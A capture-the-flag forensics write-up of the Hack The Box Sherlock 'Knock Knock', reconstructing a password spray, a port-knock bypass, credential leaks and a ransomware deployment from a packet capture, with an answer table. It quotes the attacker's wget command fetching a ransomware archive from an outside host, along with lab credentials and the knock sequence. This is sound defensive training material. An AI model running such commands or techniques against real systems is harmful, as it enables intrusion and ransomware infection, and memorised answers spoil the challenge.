---
type: challenge
platform: Hack The Box
category: "forensics"
difficulty: "medium"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - sherlock
  - forensics
  - pcap
  - ftp
  - port_knocking
  - password_spray
  - osint
  - ransomware
---

# Knock Knock?

## Overview

**Category:** forensics (Sherlock)
**Difficulty:** medium
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > A critical Forela Dev server was targeted by a threat group. The Dev server was accidentally left open to the internet which it was not supposed to be. The senior dev Abdullah told the IT team that the server was fully hardened and it's still difficult to comprehend how the attack took place and how the attacker got access in the first place. Forela recently started its business expansion in Pakistan and Abdullah was the one in charge of all infrastructure deployment and management. The Security Team need to contain and remediate the threat as soon as possible…
>
> English summary: Reconstruct an intrusion from a single 265 MB `Capture.pcap` (293,921 packets, 2023-03-20 15:37:35 → 2023-03-21 18:17:48). The attacker: port-scans, password-sprays a public FTP, finds a knockd config, port-knocks to a critical internal FTP, grabs leaked credentials, reaches a GitHub repo via OSINT, and SSHes in to download GonnaCry ransomware. Some questions require OSINT.

## Enumeration

Start point: IP `172.31.39.46` (Forela server, target) vs `3.109.209.43` (attacker — 65,641 connections, sequential SYN scan = portscan).

**Open ports found during enumeration:** `21`, `22`, `3306`, `6379`, `8086`

```bash
# Wireshark: attacker SYN scans sequentially, server answers SYN/ACK for open ports
ip.addr == 3.109.209.43 && tcp.flags.syn == 1 && tcp.flags.ack == 1 && tcp.len == 0
```

## Vulnerability (root cause)

1. Public **FTP on 21/22** with users exposed to a **password spray** (MITRE **T1110.003**).
2. A leaky **`/etc/knockd.conf`** config (`.backup`) that exposes a **port-knocking** rule + plaintext credentials.
3. **Port knocking bypass** → a "hidden" internal FTP opens.
4. Leaked creds → AWS keys, a GitHub repo (`forela-dev`) → **SSH password** → ransomware deployment.

## Exploitation (reconstructing the attacker)

### 1. Initial access — password spray on public FTP

The attacker sprays common passwords against many usernames; `Login successful` for stream 70,832:

```text
tony.shephard : Summer2023!
```

Retrieved files over FTP (Export Objects → FTP-DATA): **`.backup`** and **`fetch.sh`**.

### 2. Port knocking → critical service

`.backup` is a `knockd` config:

```ini
[options]
  UseSyslog

[FTP-INTERNAL]
  sequence    = 29999,50234,45087
  seq_timeout = 5
  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
  tcpflags    = syn

# Creds for the other backup server abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad
```

- Technique: **Port Knocking**
- Ports to knock (in order): **29999 → 50234 → 45087**
- The attacker's knock completed at **21/03/2023 10:58:50** → firewall opens **port 24456** (internal FTP).

In Wireshark I did *Decode As → FTP* on TCP port 24456 to read the login:

```text
abdullah.yasin : XhlhGame_90HJLDASxfd&hoooad     (critical FTP, login ok 21/03/2023 11:01)
```

The attacker then pulled an archived SQL export → **AWS credentials** (account ID + secret).

### 3. OSINT → SSH → ransomware

Inside the retrieved files, `.reminder` points to a company GitHub org (`Forela dev`, repo `forela-finance`, last commit `CyberJunkie`). The repo leaks the **SSH password** for the server:

```text
YHUIhnollouhdnoamjndlyvbl398782bapd
```

SSH session (from `3.109.209.43`) at `11:25:42`, and inside the stream (Wireshark `frame contains "Ransomware2"`) the attacker runs:

```text
wget http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_Server.zip   (Wget/1.21.2)
unzip Ransomware2_Server.zip    ->  Ransomware2_server/src/GonnaCry
```

Ransomware name: **GonnaCry** (a WannaCry-inspired Linux ransomware).

## Answers

| # | Question | Answer |
|---| --- | --- |
| 1 | Ports open during enumeration | `21, 22, 3306, 6379, 8086` |
| 3 | MITRE technique for initial access | `T1110.003` (Password Spraying) |
| 6 | Config file downloaded | `.backup` (`/etc/knockd.conf`) |
| 7 | Port of the critical service | `24456` |
| 8 | Technique to reach it | Port Knocking |
| 9 | Ports to knock (ascending) | `29999, 45087, 50234` |
| 11 | Credentials (critical FTP) | `abdullah.yasin : XhlhGame_90HJLDASxfd&hoooad` |
| 16 | GitHub username who owned repo | `CyberJunkie` |
| 17 | File that led to compromise | `/opt/reminders/.reminder` |
| 18 | SSH password on server | `YHUIhnollouhdnoamjndlyvbl398782bapd` |
| 20 | Download tool + version | Wget/1.21.2 |
| 21 | Ransomware name | GonnaCry |

> [!info] Tools Used
>
> - `wireshark` / `tshark` (portscan SYN/ACK, FTP export, Decode-As on 24456)
> - `zeek` + `zeek-cut` (conn.log / ftp.log filtering) — faster on 265 MB
> - `binwalk`/NetworkMiner / raw hex for carving the zip (misses HTTP Objects list)

## Flag

No flag — it's a Q&A Sherlock (answers above). Key flags recovered:

- Initial creds: `tony.shephard:Summer2023!`
- Critical FTP creds: `abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad`
- SSH password: `YHUIhnollouhdnoamjndlyvbl398782bapd`
- Ransomware download: `http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_Server.zip`

## References

- https://mwalkowski.com/post/sherlock-knock-knock/
- https://0xdf.gitlab.io/2023/12/04/htb-sherlock-knock-knock.html
- https://tmechen.me/posts/ctf/sherlock/knock-knock/
- https://hassanfaraz.medium.com/knock-knock-sherlock-writeup-d22f0dca11ae